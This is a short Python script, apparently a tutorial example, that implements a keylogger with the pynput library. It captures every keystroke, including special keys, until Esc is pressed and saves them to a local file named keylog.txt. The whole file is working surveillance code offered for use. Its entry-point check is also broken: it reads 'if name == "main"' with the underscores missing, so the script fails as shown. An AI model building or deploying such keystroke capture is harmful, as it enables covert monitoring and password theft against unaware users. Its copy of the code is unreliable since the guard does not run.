from pynput import keyboard

# Global variable to store the logged keystrokes
log = ""

# Callback function for key press event
def on_press(key):
    global log
    try:
        log += key.char  # Directly add alphanumeric characters to the log
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        log += f"[{key}]"

# Callback function for key release event
def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener on pressing 'esc' key
        return False

# Main function to set up the keylogger
def main():
    print("Simple Keylogger is running. Press 'esc' to stop.")
    
    # Create a listener for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Wait for the listener to stop (when 'esc' key is pressed)
    
    # After stopping the listener, write the logged keys to a file
    filename = "keylog.txt"
    with open(filename, "w") as f:
        f.write(log)
    
    print(f"Keystrokes logged to {filename}")

if name == "main":
    main()